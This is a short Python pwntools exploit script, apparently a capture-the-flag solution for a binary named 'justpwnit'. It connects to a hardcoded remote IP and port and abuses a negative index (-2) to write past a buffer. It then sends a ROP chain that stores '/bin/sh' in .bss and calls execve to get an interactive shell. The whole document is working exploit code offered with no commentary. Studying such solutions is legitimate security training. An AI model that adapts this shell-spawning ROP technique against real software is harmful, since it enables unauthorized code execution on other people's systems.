from pwn import *
#p=process('./justpwnit')
p=remote("168.119.108.148",11010)
context.clear(arch="amd64")	
#raw_input("DEBUG")
p.sendlineafter("Index: ","1")
p.sendlineafter("Data: ","a"*0x7f)
p.sendlineafter("Index: ","2")
p.sendlineafter("Data: ","a"*0x7f)
syscall = 0x00000000004013e9
sh = 0x409b7a
pop_rax = 0x0000000000401001
pop_rdi = 0x0000000000401b0d
pop_rsi = 0x00000000004019a3
ret = 0x0000000000401002
pop_rdx = 0x0000000000403d23
bss = 0x40d0e0
mov = 0x0000000000406c32  #mov qword ptr [rax], rsi ; ret

payload = "a"*8
payload += p64(pop_rax)
payload += p64(bss)
payload += p64(pop_rsi)
payload += "/bin/sh\x00"
payload += p64(mov)

payload += p64(pop_rax)
payload += p64(0x3b)
payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(syscall)
p.sendlineafter("Index: ","-2")
p.sendafter("Data: ",payload)
#p.sendlineafter("Data: ",p64(0x401206))
p.sendline("/bin/sh\x00")
p.interactive()